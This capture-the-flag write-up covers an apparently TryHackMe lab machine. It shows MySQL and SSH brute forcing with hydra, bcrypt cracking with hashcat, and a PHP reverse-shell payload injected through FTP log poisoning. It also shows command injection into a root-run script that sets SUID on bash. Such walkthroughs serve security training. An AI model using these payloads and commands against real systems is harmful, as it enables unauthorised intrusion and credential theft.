# Enumeration
Let's start our autorecon scan. We quickly find ports 21, 22, 80, and 3306 open.

![a6c2457ffe35382c0fe5672308b7e5cd.png](./_resources/a6c2457ffe35382c0fe5672308b7e5cd.png)

We double check with some nmap scans.

![697170bb39201b8942c08b639d3fc0d6.png](./_resources/697170bb39201b8942c08b639d3fc0d6.png)

```
$ nmap -T4 -sC -sV --version-all --osscan-guess -Pn -p 21,22,80,3306 10.10.143.178
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-30 15:58 EDT
Nmap scan report for 10.10.143.178
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c7:72:14:64:24:3c:11:01:e9:50:73:0f:a4:8c:33:d6 (RSA)
|   256 0e:0e:07:a5:3c:32:09:ed:92:1b:68:84:f1:2f:cc:e1 (ECDSA)
|_  256 32:f1:d2:ec:ec:c1:ba:22:18:ec:02:f4:bc:74:c7:af (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 65
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSigpipes, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, FoundRows, ODBCClient, Speaks41ProtocolNew, InteractiveClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsCompression, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x07`r\Q\x08[ZAJ>\x19VahMvj\x1Fm
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-10-19T04:00:09
|_Not valid after:  2031-10-17T04:00:09
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.82 seconds
```

We see that MySQL is running on port 3306. Let's run another scan on this port, this time with some scripts.

```
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.143.178
```

![ae24e8391fdbc3671bd228a81c9a1911.png](./_resources/ae24e8391fdbc3671bd228a81c9a1911.png)

Let's check the web server. There we find a login form.

![a8df7753a969d772078c0e7d133b9297.png](./_resources/a8df7753a969d772078c0e7d133b9297.png)

Given the name of the room, let's try to brute force the services we found with hydra. We'll brute force mysql; the default username is `root`, so we just have to guess the password.

```
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.143.178 mysql
```

After a few seconds, we get a hit:

![ba315fcd63f4d962c66f9e9893c83db0.png](./_resources/ba315fcd63f4d962c66f9e9893c83db0.png)

Let's access mysql by using `mysql -h 10.10.143.178 -u root -p` and then entering the password we found.

![b27976dca8fc85211ae832bfe8977215.png](./_resources/b27976dca8fc85211ae832bfe8977215.png)

Within the mysql prompt, we use `show databases;` to list the databases.

![220e6c03c5bbf6bd9dfa9b631544b1d4.png](./_resources/220e6c03c5bbf6bd9dfa9b631544b1d4.png)

The `website` database seems relevant. We access it with `use website;`. Using `show tables;` gives us a `users` table.

![58d623fcc02b27b3c20c347567d2f909.png](./_resources/58d623fcc02b27b3c20c347567d2f909.png)

`describe users;` then gives information about the columns in the `users` table.

![6e2028ab602736f1426f1c1f0a9ddaeb.png](./_resources/6e2028ab602736f1426f1c1f0a9ddaeb.png)

Now we use `select * from users` to grab all column data. We find a user, Adrian, and what appears to be a hashed password.

![7f601980b94449499b9c651dd139469f.png](./_resources/7f601980b94449499b9c651dd139469f.png)

Running the hash through a hash type identifier tells us it is a bcrypt $2*$, Blowfish (Unix) hash. Now we can use hashcat to crack the hash. Checking the hashcat examples page gives us the associated hash type number.

![fb9b23bd3f67485881938c0c5840558c.png](./_resources/fb9b23bd3f67485881938c0c5840558c.png)

Now let's run hashcat. Here I ran hashcat on my Windows machine since it's faster (and hashcat sometimes has problems running on a VM). 

```cmd
hashcat.exe -m 3200 -a 0 -o brute.txt brutehash.txt rockyou.txt
```

After a few seconds, we get a hit. The output (which in this case I called `brute.txt`) contains the cracked password.

![46fd6f970d30fe626eed712ac04f3af2.png](./_resources/46fd6f970d30fe626eed712ac04f3af2.png)

Now we can finally log in to the website using Adrian's credentials.

![6b8401a943e7a811d050238e51d6097b.png](./_resources/6b8401a943e7a811d050238e51d6097b.png)

Clicking the log button opens a webpage with a list of what appear to be login attempts.

![cc177b131ffe9f82adf0a83e8843c0a8.png](./_resources/cc177b131ffe9f82adf0a83e8843c0a8.png)

Here I noticed that the IP in the log is my machine's IP. While messing around, I was trying to access the ftp server as anonymous. So this appears to a log of attempts to access the ftp server. We will make use of this logging feature to gain an initial foothold.
<br>

# Exploitation
Let's begin looking for an exploit. Since the web server is running php, we'll tell the server to execute a php reverse shell payload via the ftp log; this is often referred to as [log poisoning](https://dheerajdeshmukh.medium.com/get-reverse-shell-through-log-poisoning-with-the-vulnerability-of-lfi-local-file-inclusion-e504e2d41f69).

Let's try to ftp into the server. When prompted for a user and password, we will enter the following payload, which we can find through a bit of Googling.

```
"<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacking IP>/9999 0>&1'"); ?>"
```

![810fbe5d2f40020ac9eff1ca82ff8eb2.png](./_resources/810fbe5d2f40020ac9eff1ca82ff8eb2.png)

Set up a netcat listener with `nc -lvnp 9999`. Clicking on the "Log" button will attempt to pull up the log, but the web page will hang. If we check our listener, we will see that we've caught a reverse shell!

![cef2206f2070fa5420cbc597fbb09eaf.png](./_resources/cef2206f2070fa5420cbc597fbb09eaf.png)

Let's look around. There are some potentially interesting files in Adrian's home directory.

![bf0a8d6ccaaf83063e121127e1df1ebc.png](./_resources/bf0a8d6ccaaf83063e121127e1df1ebc.png)

We can read the `.reminder` file:

```txt
Rules:
best of 64
+ exclamation

ettubrute
```

"Rules" in the context of brute forcing refer to password generating rules. Best of 64 is likely referring to [this particular rule](https://github.com/hashcat/hashcat/blob/master/rules/best64.rule). The reminder suggests that we should [create a wordlist](https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/) by applying the given rules to the string `ettubrute`. 

First, we create a `wordlist1.txt` file containing the lone string `ettubrute`. We then run
```
hashcat64.bin wordlist1.txt -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist2.txt
```
to generate `wordlist2.txt`, which is obtained by applying the [best64](https://github.com/hashcat/hashcat/blob/master/rules/best64.rule) hashcat rule. Here I had to use an older versino of hashcat, since the current version didn't want to run on my VM.

The reminder also tells us to add an exclamation mark, presumably at the end of each word in our list. We'll have to create our own rule file for this, which we call `append_exc.txt`. It consists of two lines:

```txt
:
$!
```

This will produce a new list consisting of all words in the old list, plus all words with an exclamation mark appended at the end. We use

```txt
./hashcat-cli64.bin ~/Documents/THM/Brute/wordlist2.txt -r ~/Documents/THM/Brute/append_exc.txt --stdout > ~/Documents/THM/Brute/wordlist3.txt 
```

to generate the wordlist. Great! Now we (presumably) have the correct wordlist. Let's use this to try to brute force one of the other services we found with adrian as the user. Let's use hydra to brute force ftp:

`hydra -l adrian -P wordlist3.txt 10.10.136.168 ftp`

![67b969b51ac83821ff5e5e9a90a2ad54.png](./_resources/67b969b51ac83821ff5e5e9a90a2ad54.png)

We quickly find the password. Now let's log in to the ftp server using the credentials we found.

![f10cf0e57e71cd8d76274c07f85b0985.png](./_resources/f10cf0e57e71cd8d76274c07f85b0985.png)

Looking around, we find two files: a hidden notes file, and a script. We'll move them to our local machine with `get`, then read the contents.

![a4508054e3e2d6695a7b951e9633a293.png](./_resources/a4508054e3e2d6695a7b951e9633a293.png)

![63433620d30dcc77368e6552d347bcad.png](./_resources/63433620d30dcc77368e6552d347bcad.png)

This will be relevant later, but for now let's move on and try to brute force ssh.

`hydra -l adrian -P wordlist3.txt 10.10.136.168 ssh -t 4`

![3fb392d19e10ae95f5b1b0cbdb52ffb6.png](./_resources/3fb392d19e10ae95f5b1b0cbdb52ffb6.png)

Again, hydra quickly finds the password. Great! Now we can ssh into the machine as adrian.

![70f15ee01504fb36752f28c21ca845f7.png](./_resources/70f15ee01504fb36752f28c21ca845f7.png)

From here, we can now read the `user.txt` flag which we found a while ago.

![238b53c3f151627e7d4c4c5b3d721eac.png](./_resources/238b53c3f151627e7d4c4c5b3d721eac.png)
<br>

# Post-Exploitation
Now that we have access to Adrian's files, let's look around. In the home directory, we have two interesting files.

![e94a12943b5c585f86736504f88ef641.png](./_resources/e94a12943b5c585f86736504f88ef641.png)

![3afa5dcc5d6323203168d63d80e0a2d2.png](./_resources/3afa5dcc5d6323203168d63d80e0a2d2.png)

![17162a9928e154ab24ab0323cec93666.png](./_resources/17162a9928e154ab24ab0323cec93666.png)

As indicated in the note we found earlier, the `punch_in` file updates every minute. We also have the script that we found earlier when investigating the ftp server. Let's take a look at it again.

![481175cc02664b3a26cf57f771671fe2.png](./_resources/481175cc02664b3a26cf57f771671fe2.png)

So, this script reads every line from the `punch_in` file above and prints it. We can use this to our advantage by editing the `punch_in` file (as we have write permissions) and inserting malicious code in a new line. When the script runs and gets to our new line, it will execute our command. Presumably, this will happen with root privileges (this is a guess based on that fact that root owns the `punch_in.sh` script). We will use the command  `echo '$(chmod u+s /bin/bash)' >> punch_in` to append a new line which sets the SUID bit for the bash binary.

After a brief wait, we check the permissions on the `/bin/bash` file and we verify that the SUID bit has indeed been set.

![352ff0cd8b43ea3cc8cf5dcd33675438.png](./_resources/352ff0cd8b43ea3cc8cf5dcd33675438.png)

Now we can use `/bin/bash -p` to run bash with elevated privileges.

![d401e93e3f148ff5cb747c790fb0baf0.png](./_resources/d401e93e3f148ff5cb747c790fb0baf0.png)

From here, we can obtain the `root.txt` flag.

![8b5b839b34ba02e870816dfdfc1d9062.png](./_resources/8b5b839b34ba02e870816dfdfc1d9062.png)